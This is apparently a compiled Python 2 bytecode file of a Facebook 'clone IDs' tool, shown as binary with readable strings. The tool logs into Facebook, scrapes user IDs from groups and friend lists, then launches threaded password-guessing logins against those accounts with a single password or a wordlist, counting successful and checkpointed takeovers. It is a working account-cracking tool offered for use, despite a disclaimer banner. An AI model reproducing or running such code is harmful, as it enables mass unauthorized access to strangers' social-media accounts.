ó
5á[c           @  sU  d  d l  m Z d  d l Z d  d l Z d   Z e j   j d  d d k r~ e d e   j d  d  e j j	   n  d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l Z y d  d l Z Wn( e k
 rô e d	  e j j	   n Xd
   Z d a g  Z g  Z g  a g  a e j   Z e j e  e j e  e j e  e j e
 j    e j  e  e j! e j" j#   d d d! g e _$ d   Z% d d  Z& d   Z' d   Z( d   Z) d   Z* d   Z+ d   Z, d   Z- d   Z. d   Z/ d e j0 f d     YZ1 d   Z2 d   Z3 d   Z4 d   Z5 d    Z6 e%   e6   d S("   iÿÿÿÿ(   t   print_functionNc         C  s   i d d 6d d 6d d 6d d 6d	 d
 6d d 6} x, | D]$ } |  j  d | d | |  }  q7 W|  d 7}  |  j  d d  }  t |   d  S(   Ni   t   mi    t   hi!   t   ki"   t   bi#   t   pi$   t   cs   %ss   [%s;1ms   [0ms   0(   t   replacet   print(   t   xt   wt   i(    (    s   clone-ids.pyt   tampil   s    0"
t   .i    t   2s)   m[!] you use python pls use python2 .x.xt    s@   m[!]mechanize not found insall it by pip2 install mechanize ...c           C  s"   t    t d  t j j   d  S(   Ns	   m[!]exit(   t   simpanR   t   ost   syst   exit(    (    (    s   clone-ids.pyt   keluar   s    
t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C  sf   y' t  t j j d d d  j   a Wn n Xy' t  t j j d d d  j   a Wn n Xd  S(   Ni    s   /MBFbgroup.txtt   rs   /MBFbteman.txt(   t   openR   R   t   patht	   readlinest
   fid_bgroupt
   fid_bteman(    (    (    s   clone-ids.pyt   bacaData$   s    ' ' c         C  s   x y t  d |   } Wn t d  t   n X| r^ | j   | k rN Pq t d  q q t |  d k r t d  q q Pq W| S(   Ns   [32;1m%s[31;1m:[33;1ms   
m[!]cancels   m[!]Enter the option...i    s   m[!]Enter correctlly(   t	   raw_inputR   R   t   uppert   len(   R	   t   vt   a(    (    s   clone-ids.pyt   inputD,   s     


c         C  sR   xK y t  t |    } Wn t d  q n X| | k r@ Pq t d  q W| S(   Ns   m[!]No choice(   t   intR"   R   (   R	   t   dR   (    (    s   clone-ids.pyt   inputM@   s    
c           C  sà   t  t  d k rn t d  y; t t j j d d d  j d j t   t d  Wqn t d  qn Xn  t  t	  d k rÜ t d  y; t t j j d d	 d  j d j t	   t d
  WqÜ t d  qÜ Xn  d  S(   Ni    s   h[*]s   /MBFbgroup.txtR
   s   
s)   h[!]sucessfuly overwrite cMBFbgroup.txts   m[!]Failed to saves   h[*]Saves the resultes...s   /MBFbteman.txts*   h[!]Succesfuly overwrite cMBFbgteman.txt(
   R   t	   id_bgroupR   R   R   R   R   t   writet   joint	   id_bteman(    (    (    s   clone-ids.pyR   L   s    
-
-c         C  s   t  d |   y+ t j |   } t t j _ | j   } Wn t  d |   t   n Xd | k rw t t j	   j
  S| Sd  S(   Ns   h[*]Loading ids ps   m[!]Failed to open ps   <link rel="redirect" href="(   R   t   brR   t   Truet   _factoryt   is_htmlt   readR   t   bukat	   find_linkt   url(   R$   R	   (    (    s   clone-ids.pyR/   [   s    c          C  s  t  d  }  t  d  } t d  t d  t j d d  |  t j d <| t j d <t j   t j   } d	 | k s d
 | k rÚ t d  t d  t j d d  j	 } t
 j d |  d } t d |  d a n* d | k rú t d  t   n
 t d  d  S(   Ns   [?]Emails   [?]passwords   h[*]getting login....s   https://m.facebook.comt   nri    t   emailt   passs   save-devicet   m_sesss   h[*]Login sucessfuls$   https://mobile.facebook.com/home.phpt	   url_regexs
   logout.phps
   \((.*a?)\)s6   h[*]welcomek%s
h[*]check group link for group id...i   t
   checkpoints9   m[!]Account gets Checkpoint
k[!]try logining with operas   m[!]Login failed(   R"   R   R/   R*   t   select_formt   formt   submitt   geturlR0   t   textt   ret   findallt   logR   (   t   ust   paR1   t   nama(    (    s   clone-ids.pyt   loginh   s(    




	

c         C  s<   x5 t  j d |   D]! } t j |  t d |  q Wd  S(   Ns&   /friends/hovercard/mbasic/\?uid=(.*?)&s   c==>b%sm(   R=   R>   R)   t   appendR   (   R   R   (    (    s   clone-ids.pyt   saring_id_teman   s    c         C  s   x t  j d |   D]x } | j d  d k rC | j d d  } n | j d d  j d d  } | t k r t d |  t j |  q q Wd  S(	   Ns   <h3><a href="/(.*?)fref=pbs   profile.phpiÿÿÿÿt   ?t    s   profile.php?id=s   &amp;s	   k==>c%s(   R=   R>   t   findR   R&   R   RD   (   R$   R   R!   (    (    s   clone-ids.pyt   saring_id_group1   s    c          C  s§   x t  d  a t d  t d t d  }  d j t j d |   d j   d  } y t j	 d	 d
  j
 } PWq t d  q q Xq Wt d |  t |   | S(   Ns    [?]group id >EX> 488575521641382s   h[*]Check the group....s0   https://m.facebook.com/browse/group/members/?id=sI   &amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdrR   s   <title>(.*?)</title>i    i   R6   s   /browse/group/members/s   m[!]group id is incoreccets+   h[*]Clone same passwrd ids from group c%s(   R"   t   id_groupR   R/   R(   R=   R>   t   splitR*   R0   R1   RI   (   R!   RB   t   next(    (    s   clone-ids.pyt   saring_id_group0   s    
)

c          C  sÑ   t  d k r6 t d  t   t  d k r6 t   q6 n  t   }  xL t t |    y t j d d  j	 }  WqB t d t
 t   PqB XqB Wt   t d d d	 g  } | j   d k rÆ t t  St   Sd  S(
   Ni   s   h[*]Login first...i    R6   s   /browse/group/members/s   m[!]can only take h %d ids   [?]clone ids directly (y/n)t   Yt   N(   R?   R   RC   R   RM   RI   R/   R*   R0   R1   R   R&   R   R"   R   t   crackt   menu(   RL   R   (    (    s   clone-ids.pyt   idgroup   s$    
		
c          C  s5  t  d k r6 t d  t   t  d k r6 t   q6 n  t t d   y t j d d  j }  WnA t	 t
  d k r t d t	 t   q£ t d  t   n XxL t t |    y t j d d  j }  Wq¦ t d	 t	 t   Pq¦ Xq¦ Wt   t d
 d d g  } | j   d k r*t t  St   Sd  S(   Ni   s   h[*]login first...i    sp   https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuControllerR6   t   friends_center_mains   m[!]Can only take p%d ids   m[!]Cancels   m[!]can only take p%d ids   [?]clone ids  directly (y/n)RN   RO   (   R?   R   RC   R   RE   R/   R*   R0   R1   R   t   id_temanR)   R   R"   R   RP   RQ   (   RL   R   (    (    s   clone-ids.pyt   idteman°   s2    

	
t   mtc           B  s#   e  Z d    Z d   Z d   Z RS(   c         C  s/   t  j j |   | |  _ d |  _ | |  _ d  S(   Ni   (   t	   threadingt   Threadt   __init__t   idR!   R   (   t   selfR   R   (    (    s   clone-ids.pyRY   Í   s    		c         C  s   |  j  |  j f S(   N(   R!   RZ   (   R[   (    (    s   clone-ids.pyt   updateÒ   s    c      
   C  sÞ   yO t  j t  j d d d t j i |  j d 6|  j d 6 d i d d 6  } Wn: t k
 ro t j	 j
   n d	 |  _ t j	 j
   n Xd
 | j k sª d | j k r¶ d |  _ n$ d | j k rÑ d |  _ n	 d |  _ d  S(   NR1   s    https://m.facebook.com/login.phpt   dataR3   R4   t   headerssR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   User-Agenti   R5   s   save-devicei   R7   i   i    (   t   urllib2t   urlopent   Requestt   urllibt	   urlencodeRZ   R   t   KeyboardInterruptR   R   R   R!   R1   (   R[   R]   (    (    s   clone-ids.pyt   runÔ   s    O	(   t   __name__t
   __module__RY   R\   Re   (    (    (    s   clone-ids.pyRV   Ì   s   		c         C  s   t  d d d g  } | j   d k rxE t  d  } y t | d  j   } Wn t d |  q* n XPq* Wt d t |   xE | D]= } | j d d	  } t |  d
 k r t |  | d
  q q Wt  d d d g  } | j   d k rü t |   St	   Sn t |  t  d  d  Sd  S(   Ns    [?]use Passwordlist/Manual (p/m)t   Pt   Ms+   [?]passwrdfile path >>Ex>> /sdcard/file.txtR   s/   m[!]passwrdfile path >>Ex>> /sdcard/file.txt%ss#   h[*]start crack with k%d passwords   
RG   i    s(   [?]result was wrong want try again (y/n)RN   RO   s   [?]passwordi   (
   R"   R   R   R   R   R   R   t   crack0RP   RQ   (   R$   R   t   dirt   D(    (    s   clone-ids.pyRP   â   s(    

c         C  s|  t  d t |   | f  t d d d t j j j   g  } g  } g  } g  } g  } d \ } }	 g  }
 xK |  D]C } | j d d  } t |  d k rq |
 j t	 | |   qq qq WxJ |
 D]B } |	 d 7}	 t
 | _ y | j   Wq¿ t k
 r t   q¿ Xq¿ Wxy3x,|
 D]$} | j   } | d d k r| d | k r| d 7} | d d	 k rr| j | d  nl | d d k r| j | d  nH | d d k rº| j | d  n$ | d d
 k rÞ| j | d  n  t d t t |  t |	  d  d f d d t j j j   | j | d  qqWWn t k
 r[t j j   n Xy t j   d k ruPn  Wqt k
 rt   qXqWt d  t |  d k rãt  d  x% | D] } t  d | | f  qÂWn  t  d t |   t  d t |   t  d t |   t  d t |   | rtt d d d g  } | j   d k rjt |   St   Sn d Sd  S(   Ns@   h[*] Cracking =>>>% d Account <<<<= with password => m[k%sm]s0   [32;1m[*]Cracking [31;1m[[36;1m0%[31;1m][0mt   endRG   i    R   i   i   i   i   s6   [32;1m[*]Cracking [31;1m[[36;1m%0.2f%s[31;1m][0mid   t   %s8   [32;1m[*]Cracking [31;1m[[36;1m100%[31;1m][0m     s    h[*]Register for successfull ids   h==>k%s m[p%sm]s$   h[*]nmbr of clone accountsp>>   %ds$   m[*]nmbr of total accountsp>>   %ds#   k[*]nmbr of extra accounts>>    %ds$   c[*]nmbr of error idsp>>        %ds#   [?]No id found want try again (y/n)RN   RO   (   i    i    (   R   R   R   R   R   t   stdoutt   flushR   RD   RV   R+   t   daemont   startRd   R   R\   t   floatRW   t   activeCountR   R"   R   RP   RQ   (   R]   t   sandiR   t   akun_jmlt   akun_suksest   akun_cekpointt
   akun_errort
   akun_gagalt   jml0t   jml1t   thR   R!   (    (    s   clone-ids.pyRj   ú   sx     
	   
4 



c          C  sk   t  t  d k rg t d d d g  }  |  j   d k rC t t  St j t j j d d  g  a n  d S(   Ni    s)   [?]clone ids from friendlist/start? (y/n)RN   RO   s   /MBFbteman.txt(	   R   R   R"   R   RP   R   t   removeR   R   (   R   (    (    s   clone-ids.pyt   lanjutT5  s    
	c          C  sk   t  t  d k rg t d d d g  }  |  j   d k rC t t  St j t j j d d  g  a n  d S(   Ni    s%   [?]clone ids from groups/start? (y/n)RN   RO   s   /MBFbgroup.txt(	   R   R   R"   R   RP   R   R~   R   R   (   R   (    (    s   clone-ids.pyt   lanjutG?  s    
	c          C  s   t  d  t  d d	 d
 f  t d d d d g  }  |  d k rS t   t   n3 |  d k rp t   t   n |  d k r t   n  d  S(   Ns:  h
      mLatest pro Updated pro version 2.0 (25O|8k
k############################################################
#  mm       #                                         #
   ##    mmm#  m   m   mmm   m mm    mmm    mmm    mmm#
  #  #  #" "#  "m m"  "   #  #"  #  #"  "  #"  #  #" "#
  #mm#  #   #   #m#   m"""#  #   #  #      #""""  #   #
 #    # "#m##    #    "mm"#  #   #  "#mm"  "#mm"  "#m##

     ___ ____         ____ _             _
    |_ _|  _ \ ___   / ___| | ___  _ __ (_)_ __   __ _
     | || | | / __| | |   | |/ _ \| '_ \| | '_ \ / _` |
     | || |_| \__ \ | |___| | (_) | | | | | | | | (_| |
    h|___|____/|___/  \____|_|\___/|_| |_|_|_| |_|\__, |p
                                                  |___/

 _________________________________
/ This programme is coded by      \

\      hAnas Chawdharyp             /
 ---------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )/\/
                 ||---w |
                 ||    ||
################################################################
# hfb groupp==>    https://m.facebook.com/groups/488575521641382 k#
#  hGitHubp====>    https://github.com/Chawdhary007          k    #
#       mDo Not Use This Tool For IllegaL Purpos k               #
################################################################sI   k%s
c1 clone ids from group
c2 clone ids from friendlist
c3 Exit
k%st   #i   s	   [?]Choosei   i   i   s   ####################s   ####################(   R   R%   R   RR   R   RU   R   (   R   (    (    s   clone-ids.pyRQ   I  s    

(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(7   t
   __future__R    t   platformR   R   t   python_versionRK   R    R   R   t	   cookielibR=   R_   Rb   RW   t	   mechanizet   ImportErrorR   R?   R)   R&   R   R   t   BrowserR*   t   set_handle_robotst   Falset   set_handle_equivR+   t   set_handle_referert   set_cookiejart   LWPCookieJart   set_handle_redirectt   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R"   R%   R   R/   RC   RE   RI   RM   RR   RU   RX   RV   RP   Rj   R   R   RQ   (    (    (    s   clone-ids.pyt   <module>   sX   	<
														;	
	
	*